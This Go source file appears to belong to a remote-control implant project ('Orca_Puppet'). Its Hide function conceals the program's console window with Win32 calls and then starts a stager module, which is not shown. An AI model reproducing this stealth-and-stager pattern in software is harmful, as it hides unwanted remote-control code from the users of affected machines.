package hide

import (
	"Orca_Puppet/stager"
	"github.com/gonutz/ide/w32"
)

func Hide(name string) {
	HideConsole()
	stager.Init()
}

//隐藏console
func HideConsole() {
	ShowConsoleAsync(w32.SW_HIDE)
}

//显示console
func ShowConsole() {
	ShowConsoleAsync(w32.SW_SHOW)
}

func ShowConsoleAsync(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}
